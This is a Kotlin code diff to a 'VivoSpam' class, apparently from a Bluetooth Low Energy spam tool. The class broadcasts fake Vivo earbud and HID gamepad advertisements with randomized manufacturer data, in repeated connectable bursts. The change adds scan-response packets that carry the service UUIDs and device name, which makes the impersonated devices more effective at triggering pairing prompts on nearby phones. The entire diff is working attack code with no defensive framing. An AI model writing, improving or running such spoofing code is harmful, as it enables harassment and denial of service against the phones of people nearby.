@@ -96,6 +96,11 @@ class VivoSpam(private val type: VivoDevice.Type) : Spammer {
     private fun buildTwsAdvertiseData(device: VivoDevice): AdvertiseData {
         return AdvertiseData.Builder()
             .addManufacturerData(VivoDevice.COMPANY_ID, device.toRandomizedManufacturerData())
+            .build()
+    }
+
+    private fun buildTwsScanResponse(): AdvertiseData {
+        return AdvertiseData.Builder()
             .addServiceUuid(twsServiceUuid)
             .build()
     }
@@ -131,7 +136,7 @@ class VivoSpam(private val type: VivoDevice.Type) : Spammer {
 
             bluetoothAdvertiser.advertise(
                 buildTwsAdvertiseData(device),
-                null,
+                buildTwsScanResponse(),
                 forceLegacy = true,
                 connectable = true
             )
@@ -151,7 +156,7 @@ class VivoSpam(private val type: VivoDevice.Type) : Spammer {
                     bluetoothAdvertiser.stopAdvertising()
                     bluetoothAdvertiser.advertise(
                         buildTwsAdvertiseData(device),
-                        null,
+                        buildTwsScanResponse(),
                         forceLegacy = true,
                         connectable = true
                     )
@@ -181,13 +186,15 @@ class VivoSpam(private val type: VivoDevice.Type) : Spammer {
             }
             val data = AdvertiseData.Builder()
                 .addServiceUuid(hidServiceUuid)
+                .build()
+            val scanResp = AdvertiseData.Builder()
                 .setIncludeDeviceName(true)
                 .build()
             repeat(GAMEPAD_BURSTS_PER_NAME) {
                 if (!isSpamming) return
                 bluetoothAdvertiser.advertise(
                     data,
-                    null,
+                    scanResp,
                     forceLegacy = true,
                     connectable = true
                 )
